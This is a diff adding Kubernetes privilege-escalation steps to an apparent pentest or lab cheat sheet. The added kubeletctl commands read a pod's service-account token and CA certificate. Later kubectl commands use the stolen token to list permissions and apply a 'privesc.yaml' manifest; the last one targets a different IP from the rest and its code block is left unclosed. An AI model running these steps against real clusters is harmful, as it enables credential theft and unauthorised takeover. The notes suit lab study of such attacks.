@@ -38,5 +38,23 @@ psexec -u root id
 
 ```
 ## Kubernates 
+```
+kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+```
+```shell
+kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+```
+```shell
+export token=`cat k8.token`
+
+```
+```shell
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
+
+```
+```shell
+kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
+
+
 ## Logrotate 
 ## Misc 
